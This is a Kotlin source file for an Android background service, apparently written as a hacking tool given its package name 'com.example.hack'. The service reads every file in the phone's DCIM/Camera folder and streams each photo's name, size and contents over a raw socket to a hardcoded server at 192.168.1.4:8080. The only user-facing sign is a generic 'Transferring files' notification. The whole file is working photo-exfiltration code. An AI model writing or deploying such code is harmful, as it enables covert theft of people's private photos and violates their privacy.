package com.example.hack

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Environment
import android.os.IBinder
import androidx.core.app.NotificationCompat
import java.io.File
import java.io.FileInputStream
import java.io.OutputStream
import java.net.Socket

class FileTransferService : Service() {

    private val CHANNEL_ID = "FileTransferServiceChannel"
    private val SERVER_IP = "192.168.1.4" // Server IP address
    private val SERVER_PORT = 8080 // Server port number

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, createNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val directoryPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).absolutePath + "/Camera/"
        val directory = File(directoryPath)
        if (directory.exists() && directory.isDirectory) {
            val files = directory.listFiles()
            if (files != null) {
                Thread {
                    files.forEach { file ->
                        transferFile(file)
                    }
                }.start()
            }
        }
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "File Transfer Service Channel",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("File Transfer Service")
            .setContentText("Transferring files in the background")
            .setSmallIcon(R.mipmap.ic_launcher)
            .build()
    }

    private fun transferFile(file: File) {
        try {
            val socket = Socket(SERVER_IP, SERVER_PORT)
            val outputStream: OutputStream = socket.getOutputStream()

            val fileDetails = "${file.name}<SEPARATOR>${file.length()}"
            outputStream.write(fileDetails.toByteArray())

            val fileInputStream = FileInputStream(file)
            val buffer = ByteArray(4096)
            var bytesRead: Int

            while (fileInputStream.read(buffer).also { bytesRead = it } > 0) {
                outputStream.write(buffer, 0, bytesRead)
            }

            fileInputStream.close()
            outputStream.close()
            socket.close()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
